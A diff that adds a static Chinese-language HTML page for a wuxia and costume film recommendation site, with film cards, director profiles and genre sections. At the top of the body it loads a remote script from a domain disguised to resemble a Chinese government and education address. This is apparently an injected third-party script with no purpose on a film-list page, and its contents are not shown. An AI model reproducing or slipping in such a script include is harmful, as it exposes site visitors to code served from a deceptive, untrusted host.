@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>逍遥电影网 - 江湖武侠片单与古装电影</title>
+<meta name="description" content="逍遥电影网(xiaoyaodianyingwang-h5)整理武侠、古装、江湖、仙侠类经典电影片单，从胡金铨到徐克、从张彻到程小东，移动端自适应，必应收录友好。">
+<meta name="keywords" content="逍遥电影网, 武侠电影, 古装片单, 江湖电影, 仙侠片, 武侠经典, xiaoyaodianyingwang-h5">
+<meta name="author" content="逍遥电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://xiaoyaodianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --ink:#1a1a1a;
+  --ink2:#2a2a2a;
+  --qing:#3a5a6a;
+  --qing2:#4a7080;
+  --vermilion:#a8322d;
+  --paper:#f2ede0;
+  --paper2:#ebe4d2;
+  --bamboo:#6b8a5a;
+  --gold:#c9a24b;
+  --muted:#8a8068;
+  --line:rgba(58,90,106,.3);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","Noto Serif CJK SC","PingFang SC",serif;
+  background:
+    radial-gradient(120% 60% at 90% -10%, rgba(168,50,45,.12), transparent 55%),
+    radial-gradient(120% 70% at 0% 0%, rgba(58,90,106,.14), transparent 55%),
+    linear-gradient(180deg,var(--paper),#ebe4d2 60%,#e0d6be 100%);
+  color:var(--ink);line-height:1.78;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 竹帘条 */
+.bamboo-bar{
+  background:linear-gradient(90deg,var(--qing),var(--vermilion),var(--qing));
+  color:#f2ede0;text-align:center;font-size:11px;letter-spacing:4px;
+  padding:6px 10px;font-weight:700;font-family:Arial,sans-serif;
+}
+
+/* 头部 */
+.header{max-width:1120px;margin:0 auto;padding:32px 20px 18px;text-align:center}
+.brand{
+  display:inline-flex;align-items:center;gap:16px;
+  padding:14px 28px;border-radius:12px;
+  background:rgba(26,26,26,.05);border:2px solid var(--line);
+  position:relative;
+}
+.brand::before{
+  content:"印";position:absolute;left:-10px;top:-10px;
+  width:28px;height:28px;border-radius:4px;
+  background:var(--vermilion);color:#f2ede0;
+  font-size:12px;display:flex;align-items:center;justify-content:center;
+  font-weight:700;
+}
+.brand .brush{font-size:36px}
+.brand h1{font-size:30px;letter-spacing:5px;color:var(--ink)}
+.brand .en{font-family:Arial,sans-serif;font-size:11px;color:var(--muted);letter-spacing:2px;text-align:left}
+.header p.slogan{margin-top:14px;color:#5d5540;font-size:14px}
+
+/* 搜索 */
+.search-wrap{max-width:540px;margin:16px auto 0}
+.search-wrap form{display:flex;height:44px;border-radius:22px;overflow:hidden;border:2px solid var(--line);background:#faf6e8}
+.search-wrap input{flex:1;border:none;outline:none;background:transparent;padding:0 20px;font-size:13px;color:var(--ink)}
+.search-wrap button{border:none;background:var(--vermilion);color:#f2ede0;padding:0 22px;font-weight:700;cursor:pointer;letter-spacing:2px}
+
+/* 导航 */
+.nav{max-width:1120px;margin:20px auto 24px;padding:0 20px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:8px 18px;border:1px solid var(--line);border-radius:22px;font-size:13px;color:#5d5540;background:#faf6e8}
+.nav a:hover,.nav a.active{background:var(--ink);color:#f2ede0;border-color:var(--ink);font-weight:700}
+
+/* 主区 */
+.main{max-width:1120px;margin:0 auto;padding:0 20px 30px}
+
+/* 卷首 */
+.jianghu-board{
+  position:relative;overflow:hidden;
+  background:linear-gradient(135deg,#1a1a1a,#2a2a2a);
+  color:#e8e2d0;border-left:6px solid var(--gold);
+  border-radius:16px;padding:30px 28px;margin-bottom:30px;
+}
+.jianghu-board::after{content:"⚔️";position:absolute;right:18px;bottom:-20px;font-size:140px;opacity:.1}
+.jianghu-board .kicker{font-family:Arial,sans-serif;font-size:12px;color:var(--gold);letter-spacing:4px}
+.jianghu-board h2{font-size:26px;margin:8px 0 10px;color:#fff;letter-spacing:2px}
+.jianghu-board p{color:#c8c0a8;max-width:660px;font-size:14px}
+.jianghu-board .seals{margin-top:16px;display:flex;gap:10px;flex-wrap:wrap}
+.jianghu-board .seals span{padding:5px 14px;border:1px solid rgba(201,162,75,.5);border-radius:4px;font-size:12px;color:var(--gold);transform:rotate(-1deg)}
+.jianghu-board .seals span:nth-child(even){transform:rotate(1deg)}
+
+/* 栏目头 */
+.section{margin-bottom:32px}
+.s-head{display:flex;align-items:center;gap:12px;margin-bottom:16px;border-bottom:3px double var(--line);padding-bottom:10px}
+.s-head .no{
+  width:32px;height:32px;border-radius:4px;
+  background:var(--vermilion);color:#f2ede0;
+  display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px;
+}
+.s-head h3{font-size:19px;letter-spacing:2px;color:var(--ink)}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--qing);font-family:Arial,sans-serif}
+
+/* 栏目一：武侠经典 */
+.swordsman-row{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.sword-card{
+  background:#faf6e8;border:1px solid var(--line);
+  border-radius:12px;padding:20px;
+  position:relative;transition:all .3s;
+}
+.sword-card:hover{transform:translateY(-4px);box-shadow:0 8px 24px rgba(26,26,26,.12)}
+.sword-card::before{
+  content:"";position:absolute;top:0;left:20px;right:20px;height:3px;
+  background:linear-gradient(90deg,var(--vermilion),var(--gold),var(--vermilion));
+  border-radius:0 0 3px 3px;
+}
+.sword-card .school{font-size:11px;font-family:Arial,sans-serif;color:var(--muted);letter-spacing:1px}
+.sword-card h4{font-size:17px;margin:8px 0 4px;color:var(--ink);letter-spacing:1px}
+.sword-card .meta{font-size:12px;color:var(--muted);font-family:Arial,sans-serif;margin-bottom:10px}
+.sword-card p{font-size:13px;color:#4a4634}
+.sword-card .blade{margin-top:12px;display:inline-block;font-size:11px;color:var(--qing);border:1px solid var(--line);padding:3px 12px;border-radius:3px}
+
+/* 栏目二：导演谱系 */
+.master-list{background:#faf6e8;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.master-row{display:flex;gap:16px;padding:16px 18px;border-bottom:1px dashed var(--line);align-items:center}
+.master-row:last-child{border-bottom:none}
+.master-seal{width:44px;height:44px;border-radius:6px;background:var(--qing);color:#f2ede0;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:16px;flex-shrink:0;font-family:"Songti SC",serif}
+.master-info{flex:1}
+.master-info h4{font-size:16px;color:var(--ink);letter-spacing:1px}
+.master-info p{font-size:12px;color:var(--muted);margin-top:2px}
+.master-tag{font-size:11px;color:var(--vermilion);border:1px solid var(--line);padding:4px 12px;border-radius:3px;white-space:nowrap;font-family:Arial,sans-serif}
+
+/* 栏目三：兵器谱 横向 */
+.ink-grid{display:flex;gap:16px;overflow-x:auto;padding-bottom:12px;scroll-snap-type:x mandatory}
+.ink-card{scroll-snap-align:start;flex:0 0 230px;background:#faf6e8;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.ink-top{height:84px;display:flex;align-items:center;justify-content:center;font-size:36px;background:linear-gradient(135deg,var(--ink),#3a3a3a);color:var(--gold)}
+.ink-card:nth-child(2) .ink-top{background:linear-gradient(135deg,var(--qing),var(--qing2))}
+.ink-card:nth-child(3) .ink-top{background:linear-gradient(135deg,var(--vermilion),#7a221e)}
+.ink-card:nth-child(4) .ink-top{background:linear-gradient(135deg,var(--bamboo),#4a6a3a)}
+.ink-card:nth-child(5) .ink-top{background:linear-gradient(135deg,var(--gold),#9a7222)}
+.ink-body{padding:14px}
+.ink-body h4{font-size:15px;color:var(--ink);margin-bottom:4px;letter-spacing:1px}
+.ink-body p{font-size:12px;color:var(--muted);line-height:1.6}
+
+/* 栏目四：仙侠与奇幻 */
+.fantasy-row{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.fantasy-card{
+  background:#faf6e8;border:1px solid var(--line);
+  border-left:4px solid var(--bamboo);
+  border-radius:10px;padding:18px;
+}
+.fantasy-card h4{font-size:16px;color:var(--ink);margin-bottom:4px}
+.fantasy-card .meta{font-size:12px;color:var(--muted);font-family:Arial,sans-serif;margin-bottom:8px}
+.fantasy-card p{font-size:13px;color:#4a4634}
+
+/* 栏目五：关于 */
+.about{background:var(--ink);color:#d8d0b8;border-radius:14px;padding:26px;display:flex;gap:20px;align-items:flex-start;flex-wrap:wrap}
+.about .ico{font-size:40px}
+.about h3{font-size:18px;color:var(--gold);margin-bottom:8px;letter-spacing:1px}
+.about p{font-size:13px;color:#b8b09a;max-width:680px}
+.about .url{margin-top:10px;font-family:Arial,sans-serif;font-size:12px;color:var(--gold)}
+
+/* 页脚 */
+.footer{margin-top:32px;border-top:4px double var(--line);padding:28px 20px 40px;text-align:center;color:var(--muted);font-size:12px;font-family:Arial,sans-serif}
+.footer a{color:var(--qing)}
+.footer .fn{margin-top:14px;display:flex;justify-content:center;gap:18px;flex-wrap:wrap}
+.footer .fn a{color:var(--muted)}
+.footer .fn a:hover{color:var(--ink)}
+
+@media(max-width:860px){.swordsman-row{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .brand h1{font-size:22px}
+  .brand .brush{font-size:28px}
+  .nav a{padding:6px 14px;font-size:12px}
+  .jianghu-board{padding:22px 18px}
+  .jianghu-board h2{font-size:21px}
+  .main{padding:0 16px 24px}
+  .swordsman-row{grid-template-columns:1fr}
+  .fantasy-row{grid-template-columns:1fr}
+  .master-row{flex-wrap:wrap;gap:10px}
+  .master-tag{margin-left:0}
+  .ink-card{flex-basis:82%}
+  .about{padding:20px 16px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bamboo-bar">⚔️ 逍遥电影网 · 武侠 / 古装 / 江湖 / 仙侠 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="brand">
+    <div class="brush">🗡️</div>
+    <div>
+      <h1>逍遥电影网</h1>
+      <div class="en">xiaoyaodianyingwang-h5 · Jianghu Cinema</div>
+    </div>
+  </div>
+  <p class="slogan">"有人的地方就有江湖"——从胡金铨的禅意武侠，到徐克的漫画江湖，再到张艺谋的色彩武侠，这里是刀光剑影的片单馆。</p>
+  <div class="search-wrap">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜 胡金铨 / 徐克 / 张彻 / 程小东 / 侠客行...">
+      <button type="submit">入江湖</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">首页</a>
+  <a href="#">武侠经典</a>
+  <a href="#">古装历史</a>
+  <a href="#">仙侠奇幻</a>
+  <a href="#">动作武指</a>
+  <a href="#">导演谱系</a>
+  <a href="#">兵器谱</a>
+  <a href="#">关于逍遥</a>
+</nav>
+
+<div class="main">
+
+  <section class="jianghu-board">
+    <div class="kicker">◆ 江 湖 片 单 ◆</div>
+    <h2>江湖不老，刀剑犹温</h2>
+    <p>逍遥电影网只做武侠、古装、江湖、仙侠类电影片单整理。从新武侠的写意留白，到老港片的硬桥硬马，再到新世纪的数字武侠，一部一部排给你看。单页静态、移动端自适应、内页 # 占位，不提供盗版下载。</p>
+    <div class="seals">
+      <span>刀</span><span>剑</span><span>琴</span><span>棋</span><span>酒</span><span>茶</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="classics">
+    <div class="s-head"><span class="no">壹</span><h3>武侠经典</h3><a class="more" href="#">全部 #</a></div>
+    <div class="swordsman-row">
+      <article class="sword-card">
+        <div class="school">SCHOOL · 新武侠</div>
+        <h4>《侠女》</h4>
+        <div class="meta">1971 · 胡金铨 · 台湾/香港</div>
+        <p>竹林追杀、禅意剪辑、东方美学。戛纳技术大奖，武侠片的艺术巅峰，后来者的教科书。</p>
+        <span class="blade"># 胡金铨 # 竹林</span>
+      </article>
+      <article class="sword-card">
+        <div class="school">SCHOOL · 漫画武侠</div>
+        <h4>《新龙门客栈》</h4>
+        <div class="meta">1992 · 李惠民 · 香港</div>
+        <p>大漠、客栈、东厂番子、江湖儿女。徐克监制，程小东武指，港式武侠的黄金标本。</p>
+        <span class="blade"># 徐克 # 客栈</span>
+      </article>
+      <article class="sword-card">
+        <div class="school">SCHOOL · 写意武侠</div>
+        <h4>《卧虎藏龙》</h4>
+        <div class="meta">2000 · 李安 · 台湾/香港/美国</div>
+        <p>竹林之巅、青冥宝剑、压抑的情欲。奥斯卡最佳外语片，让世界看懂中国武侠的"意"。</p>
+        <span class="blade"># 李安 # 奥斯卡</span>
+      </article>
+      <article class="sword-card">
+        <div class="school">SCHOOL · 硬桥硬马</div>
+        <h4>《独臂刀》</h4>
+        <div class="meta">1967 · 张彻 · 香港</div>
+        <p>断臂、复仇、血溅银幕。张彻开创"阳刚武侠"，王羽成了第一代武侠明星。</p>
+        <span class="blade"># 张彻 # 邵氏</span>
+      </article>
+      <article class="sword-card">
+        <div class="school">SCHOOL · 数字武侠</div>
+        <h4>《英雄》</h4>
+        <div class="meta">2002 · 张艺谋 · 大陆</div>
+        <p>红、蓝、白、绿，把武侠拍成了色彩交响。从那一刻起，中国大片有了自己的语法。</p>
+        <span class="blade"># 张艺谋 # 色彩</span>
+      </article>
+      <article class="sword-card">
+        <div class="school">SCHOOL · 武侠喜剧</div>
+        <h4>《东成西就》</h4>
+        <div class="meta">1993 · 刘镇伟 · 香港</div>
+        <p>一群影帝影后胡闹到底，香肠嘴、正宗师兄。武侠也可以这么疯、这么好笑。</p>
+        <span class="blade"># 刘镇伟 # 癫狂</span>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="masters">
+    <div class="s-head"><span class="no">贰</span><h3>导演谱系</h3><a class="more" href="#">完整 #</a></div>
+    <div class="master-list">
+      <div class="master-row">
+        <div class="master-seal">胡</div>
+        <div class="master-info"><h4>胡金铨</h4><p>《大醉侠》《侠女》《空山灵雨》——禅意、留白、考据狂，武侠片第一个作者</p></div>
+        <div class="master-tag">新武侠之父</div>
+      </div>
+      <div class="master-row">
+        <div class="master-seal">张</div>
+        <div class="master-info"><h4>张彻</h4><p>《独臂刀》《报仇》《马永贞》——阳刚、血浆、男儿情义，邵氏硬派掌门</p></div>
+        <div class="master-tag">阳刚武侠</div>
+      </div>
+      <div class="master-row">
+        <div class="master-seal">徐</div>
+        <div class="master-info"><h4>徐克</h4><p>《黄飞鸿》《新龙门客栈》《刀》——漫画感、凌厉剪辑、永远在革新</p></div>
+        <div class="master-tag">武侠革新者</div>
+      </div>
+      <div class="master-row">
+        <div class="master-seal">程</div>
+        <div class="master-info"><h4>程小东</h4><p>《倩女幽魂》《新龙门客栈》——飘逸、浪漫、东方舞蹈化的动作美学</p></div>
+        <div class="master-tag">动作指导</div>
+      </div>
+      <div class="master-row">
+        <div class="master-seal">李</div>
+        <div class="master-info"><h4>李安</h4><p>《卧虎藏龙》《绿巨人》——把武侠的"意"翻译成世界语言</p></div>
+        <div class="master-tag">国际表达</div>
+      </div>
+      <div class="master-row">
+        <div class="master-seal">王</div>
+        <div class="master-info"><h4>王家卫</h4><p>《东邪西毒》——武侠的另一种写法：孤独、记忆、沙漠里的时间</p></div>
+        <div class="master-tag">另类武侠</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="weapons">
+    <div class="s-head"><span class="no">叁</span><h3>兵器谱 · 类型抽屉</h3><a class="more" href="#">更多 #</a></div>
+    <div class="ink-grid">
+      <div class="ink-card"><div class="ink-top">🗡️</div><div class="ink-body"><h4>剑客行</h4><p>《独孤九剑》《剑雨》《绣春刀》——剑是君子的兵器</p></div></div>
+      <div class="ink-card"><div class="ink-top">🏹</div><div class="ink-body"><h4>弓与飞刀</h4><p>《英雄》《十面埋伏》——远程之美，百步穿杨</p></div></div>
+      <div class="ink-card"><div class="ink-top">🔥</div><div class="ink-body"><h4>火器与火药</h4><p>《新龙门客栈》《满城尽带黄金甲》——冷兵器到热兵器的过渡</p></div></div>
+      <div class="ink-card"><div class="ink-top">🪷</div><div class="ink-body"><h4>空手与拳脚</h4><p>《叶问》《一代宗师》——功夫片的宗师谱系</p></div></div>
+      <div class="ink-card"><div class="ink-top">🎭</div><div class="ink-body"><h4>戏曲武侠</h4><p>《霸王别姬》式的武戏文唱，京腔与刀光</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="fantasy">
+    <div class="s-head"><span class="no">肆</span><h3>仙侠与奇幻</h3><a class="more" href="#">完整 #</a></div>
+    <div class="fantasy-row">
+      <article class="fantasy-card">
+        <h4>《倩女幽魂》</h4>
+        <div class="meta">1987 · 程小东导演 / 徐克监制 · 香港</div>
+        <p>书生与女鬼，兰若寺、树妖、燕赤霞。王祖贤的白衣成了华语影史最经典的鬼魂形象，张国荣的书生至今无人超越。</p>
+      </article>
+      <article class="fantasy-card">
+        <h4>《青蛇》</h4>
+        <div class="meta">1993 · 徐克 · 香港</div>
+        <p>张曼玉、王祖贤双蛇出洞，把白蛇传拍成了女性欲望与姐妹情谊的寓言。黄霑的配乐是另一个主角。</p>
+      </article>
+      <article class="fantasy-card">
+        <h4>《无极》</h4>
+        <div class="meta">2005 · 陈凯歌 · 大陆</div>
+        <p>倾城、昆仑、光明。中国电影第一次大规模尝试奇幻大片工业，美术是满分的，叙事至今争议。</p>
+      </article>
+      <article class="fantasy-card">
+        <h4>《捉妖记》</h4>
+        <div class="meta">2015 · 许诚毅 · 大陆</div>
+        <p>胡巴出世，中国奇幻喜剧的商业突破。人妖共存的世界观，让"妖"第一次这么可爱。</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目五 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="no">伍</span><h3>关于逍遥</h3></div>
+    <div class="about">
+      <div class="ico">🎋</div>
+      <div>
+        <h3>逍遥电影网 —— 一个有侠气的片单站</h3>
+        <p>逍遥电影网（xiaoyaodianyingwang-h5）专注武侠、古装、江湖、仙侠类电影片单整理与导演谱系梳理。从胡金铨到徐克，从张彻到程小东，从邵氏到新世纪华语大片，一部一部排给你看。本站为单页静态站，移动端自适应，内页 # 占位，不提供盗版下载，不托管未授权视频资源。</p>
+        <div class="url">https://xiaoyaodianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 逍遥电影网 | xiaoyaodianyingwang-h5</div>
+  <div>永久地址：<a href="https://xiaoyaodianyingwang-h5.github.io">https://xiaoyaodianyingwang-h5.github.io</a></div>
+  <div>本站为武侠/古装/仙侠电影推荐与片单整理站，不提供盗版资源下载。</div>
+  <div class="fn">
+    <a href="#">首页</a><a href="#">武侠</a><a href="#">古装</a><a href="#">仙侠</a><a href="#">导演</a><a href="#">兵器</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
